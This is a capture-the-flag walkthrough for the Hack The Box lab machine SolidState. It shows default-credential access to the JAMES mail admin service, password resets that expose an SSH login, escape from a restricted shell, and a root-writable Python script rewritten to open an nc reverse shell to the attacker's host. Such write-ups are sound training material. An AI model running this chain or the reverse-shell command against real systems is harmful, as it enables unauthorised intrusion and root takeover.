# HTB - Solidstate  10.10.10.51

- Debian GNU/Linux 9
- Linux version 4.9.0-3-686-pae 

- Use JAMES Remote Admin 2.3.2 default credentials root:root
- List mail account and reset their password
- Read mail on 110 port: Get ssh credentials
- Connect thanks ssh, get user.txt
- Find root owned writable file, write a reverse nc in it
- Get root shell 


## Nmap

```
22/tcp  open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp  open  smtp    JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.32 [10.10.14.32]), 
80/tcp  open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Home - Solid State Security
110/tcp open  pop3    JAMES pop3d 2.3.2
119/tcp open  nntp    JAMES nntpd (posting ok)
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
```

## 80: Some useless site


![](images/solidstate.png)



## 4555 : Remote admin to reset mail paswords


Find exploit in internet for JAMES Remote Admin 2.3.2
Default credentials : root/root
Exploit trigger onmly when user loggin... useless
Let use default credentials to reset users mail password

```
# nc 10.10.10.51 4555
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
help
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection

listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin

setpassword james james
Password for james reset
setpassword thomas thomas
Password for thomas reset
setpassword john john
Password for john reset
setpassword mindy mindy
Password for mindy reset
setpassword mailadmin mailadmin
Password for mailadmin reset

```


## 110 ; Read mails, give ssh credentials

```
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user john
+OK
pass john
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user thomas
+OK
pass thomas
+OK Welcome thomas
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user john
+OK
pass john
+OK Welcome john
list
+OK 1 743
1 743
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James

.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user james
+OK
pass james
+OK Welcome james
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mindy
+OK
pass mindy
+OK Welcome mindy
list
+OK 2 1945
1 1109
2 836
.
retr 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
retr 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~# telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
user mailadmin
+OK
pass mailadmin
+OK Welcome mailadmin
list
+OK 0 0
.
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```

## ssh mindy

```
# ssh mindy@10.10.10.51 
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cat user.txt 
XXXXXXXXXXXXXXXXXXXXX
```


## system

```
$ cat /proc/version
Linux version 4.9.0-3-686-pae (debian-kernel@lists.debian.org) (gcc version 6.3.0 20170516 (Debian 6.3.0-18) ) #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06)
mindy@solidstate:~$ cat /etc/issue
Debian GNU/Linux 9 \n \l
```


## elevation

Mindy shell is reestricted...
```
$ echo $PATH
/home/mindy/bin

$ ls -al bin
total 8
drwxr-x--- 2 mindy mindy 4096 Aug 22  2017 .
drwxr-x--- 4 mindy mindy 4096 Sep  8  2017 ..
lrwxrwxrwx 1 root  root     8 Aug 22  2017 cat -> /bin/cat
lrwxrwxrwx 1 root  root     8 Aug 22  2017 env -> /bin/env
lrwxrwxrwx 1 root  root     7 Aug 22  2017 ls -> /bin/ls


```

Execute commands remotly with ssh
```
# sshpass -p 'P@55W0rd1!2@' ssh -t mindy@10.10.10.51 'ls -alR /'> out.txt
Connection to 10.10.10.51 closed.
```

Get a remote bash :)
```
# sshpass -p 'P@55W0rd1!2@' ssh -t mindy@10.10.10.51 'bash'
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls
bin  user.txt
```

Sticky bit ?
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ find / -perm -4000 2>/dev/null | xargs ls -al
-rwsr-xr-x 1 root root        30112 Jun 23  2016 /bin/fusermount
-rwsr-xr-x 1 root root        38940 Mar 22  2017 /bin/mount
-rwsr-xr-x 1 root root       161520 Feb 26  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root        68076 Nov 10  2016 /bin/ping
-rwsr-xr-x 1 root root        39144 May 17  2017 /bin/su
-rwsr-xr-x 1 root root        26504 Mar 22  2017 /bin/umount
-rwsr-xr-x 1 root root        48560 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root        39632 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root        78340 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root        34920 May 17  2017 /usr/bin/newgrp
-rwsr-xr-x 1 root root        57972 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root        22304 May 24  2017 /usr/bin/pkexec
-rwsr-xr-- 1 root messagebus  46436 Apr  5  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root         5480 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root       525932 Jun 17  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root        13960 May 24  2017 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root        13672 Jan 14  2017 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
-rwsr-sr-x 1 root root         9772 Jul  7  2017 /usr/lib/xorg/Xorg.wrap
-rwsr-xr-- 1 root dip        363140 Nov 11  2016 /usr/sbin/pppd
```
Nothing..

Root owned writable files ?
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ find / -user root -perm -002 -type f -not -path "/proc/*"  2>/dev/null
/opt/tmp.py
/sys/fs/cgroup/memory/cgroup.event_control

${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()
```

Does nc accept -e ?
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ nc 10.10.14.32 4444 -e /bin/bash
```
Nice :)
Edit /opt/tmp.py
```
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ vi /opt/tmp.py
${debian_chroot:+($debian_chroot)}mindy@solidstate:/$ cat /opt/tmp.py
#!/usr/bin/env python
import os
import sys
try:
     os.system('nc 10.10.14.32 4444 -e /bin/bash')
except:
     sys.exit()
```
Wait and get a shell

```
# nc -lvp 4444
listening on [any] 4444 ...

10.10.10.51: inverse host lookup failed: Unknown host
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.51] 47150

id
uid=0(root) gid=0(root) groups=0(root)

pwd
/root

cat root.txt
XXXXXXXXXXXXXXXXXXXXXXXXXXXXxx
```



